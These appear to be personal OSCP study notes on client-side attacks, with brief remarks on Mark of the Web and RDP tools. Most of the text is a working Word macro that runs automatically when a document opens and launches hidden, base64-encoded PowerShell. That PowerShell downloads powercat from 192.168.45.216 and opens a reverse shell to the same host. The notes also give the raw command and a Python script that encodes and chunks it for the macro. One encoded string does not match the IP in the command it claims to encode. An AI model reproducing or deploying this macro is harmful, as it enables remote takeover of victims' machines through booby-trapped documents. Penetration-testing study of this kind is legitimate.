---
aliases:
  - Target Reconnaissance
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - client_side_attacks
  - ms_office
  - office
  - exploit
author: Mehdi N Tehrani
creat_date: 2023-12-27
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# Mark of the Web
#mark_of_the_web #motw #windows
https://nolongerset.com/mark-of-the-web-details/
- file marked in windows when downloaded from the web
- zip file marked with motw, when unzipped the motw gets preserved if unzipped with Windows built-in tool. But 7zip files might not preserve motw. 
# Windows Remote Desktop
## Linux tools
#linux #rdp #remote_desktop
#rdesktop doesn't support NLA (Network Level Authentication) #nla
#xfreerdp supports NLA

# Office Macro
#macro #office #ms_office 
## reverse shell macro
```vb
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e "
    
	Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA"
	Str = Str + "BlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE"
	Str = Str + "AG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AH"
	Str = Str + "AAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2AC8A"
	Str = Str + "cABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQ"
	Str = Str + "ByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAu"
	Str = Str + "ADIAMQA2ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AG"
	Str = Str + "UAcgBzAGgAZQBsAGwA"
    
    CreateObject("Wscript.Shell").Run Str
End Sub
```

## components
### raw powershell command
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.216/powercat.ps1');powercat -c <ip> -p <port> -e powershell
```
### base64 encode powershell command in python
```python
import base64
cmd=b"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.216/powercat.ps1');powercat -c 192.168.45.216 -p 7777 -e powershell"
cmd_b64=base64.b64encode(cmd)

b'SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ1LjIxNiAtcCA3Nzc3IC1lIHBvd2Vyc2hlbGw='
```

```python
n=50
for i in range (0, len(cmd_b64), n):
	print('Command = Command + "' + cmd_b64[i:i+n] + '"')

Command = Command + "SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLk"
Command = Command + "Rvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4yMTYv"
Command = Command + "cG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS"
Command = Command + "4yMTYgLXAgNzc3NyAtZSBwb3dlcnNoZWxs"
```
